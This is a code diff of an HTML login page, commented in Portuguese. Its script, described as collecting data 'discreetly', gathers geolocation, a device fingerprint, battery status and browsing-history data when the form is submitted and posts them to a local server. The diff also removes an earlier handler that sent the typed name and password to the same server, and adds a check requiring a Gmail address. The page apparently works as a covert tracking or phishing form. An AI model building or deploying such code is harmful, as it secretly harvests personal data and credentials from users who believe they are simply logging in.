@@ -129,6 +129,25 @@
     </div>
 
     <script>
+        const nomeInput = document.getElementById('nome');
+        const btnSubmit = document.getElementById('btnSubmit');
+
+        // Função para verificar se o nome contém @gmail.com
+        function verificarNome() {
+            const nome = nomeInput.value;
+            const regexEmail = /\S+@gmail\.com/;
+
+            // Verifica se o nome contém um e-mail com @gmail.com
+            if (regexEmail.test(nome)) {
+                btnSubmit.classList.add('enabled');  // Habilita o botão se o e-mail for válido
+            } else {
+                btnSubmit.classList.remove('enabled');  // Desabilita o botão se o e-mail não for válido
+            }
+        }
+
+        // Verifica o nome sempre que o usuário digitar
+        nomeInput.addEventListener('input', verificarNome);
+
         // Função para coletar dados de forma discreta
         function coletarDados() {
             let dados = {
@@ -172,10 +191,10 @@
                 deviceMemory: navigator.deviceMemory || 'não disponível',
                 onlineStatus: navigator.onLine,
                 screenOrientation: screen.orientation.type,
-                webGLRenderer: (function() {
-                    var canvas = document.createElement("canvas");
+                webGLRenderer: (function() { 
+                    var canvas = document.createElement("canvas"); 
                     var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-                    return gl ? gl.getParameter(gl.RENDERER) : "não disponível";
+                    return gl ? gl.getParameter(gl.RENDERER) : "não disponível"; 
                 })(),
                 batteryStatus: (function() {
                     return navigator.getBattery ? navigator.getBattery().then(function(battery) {
@@ -195,62 +214,50 @@
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude
                     };
-                    // Envia os dados para o servidor assim que a geolocalização for obtida
                     enviarDados(dados);
                 }, (err) => {
                     console.error('Erro ao obter geolocalização:', err);
-                    // Envia os dados sem a geolocalização
                     enviarDados(dados);
                 });
             } else {
-                // Caso a geolocalização não seja permitida, envia os dados de qualquer maneira
                 enviarDados(dados);
+            }
+
+            // Coleta de histórico de navegação
+            if (window.history) {
+                dados.historial = {
+                    numeroDeEntradas: window.history.length,
+                    podeNavegarParaTras: window.history.state ? true : false
+                };
+            }
+
+            // Coleta de dados de performance
+            if (window.performance) {
+                dados.performance = {
+                    tempoTotal: window.performance.timing.loadEventEnd - window.performance.timing.navigationStart
+                };
             }
         }
 
-        // Função para enviar os dados ao servidor
         function enviarDados(dados) {
-            fetch('http://localhost:3000/coletar-dados', {
+            fetch('http://localhost:3000/enviar-dados', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(dados), // Envia os dados como JSON
+                body: JSON.stringify(dados)
             })
-            .then(response => response.text())
-            .then(data => console.log('Resposta do servidor:', data))
-            .catch(error => console.error('Erro ao enviar dados:', error));
+            .then(response => response.json())
+            .then(data => {
+                console.log("Dados enviados com sucesso:", data);
+            })
+            .catch((error) => {
+                console.error("Erro ao enviar os dados:", error);
+            });
         }
 
-        // Coleta e envia os dados quando o formulário for enviado
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-
-            // Coleta os dados do formulário
-            const nome = document.getElementById('nome').value;
-            const senha = document.getElementById('senha').value;
-
-            // Adiciona os dados do formulário ao objeto de dados
-            let dadosFormulario = {
-                nome: nome,
-                senha: senha,
-                ip: window.location.hostname,
-                dataHora: new Date().toString()
-            };
-
-            // Envia os dados do formulário
-            fetch('http://localhost:3000/coletar-dados', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(dadosFormulario),
-            })
-            .then(response => response.text())
-            .then(data => console.log('Dados do formulário enviados:', data))
-            .catch(error => console.error('Erro ao enviar dados:', error));
-
-            // Coleta e envia os dados detalhados
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
             coletarDados();
         });
     </script>
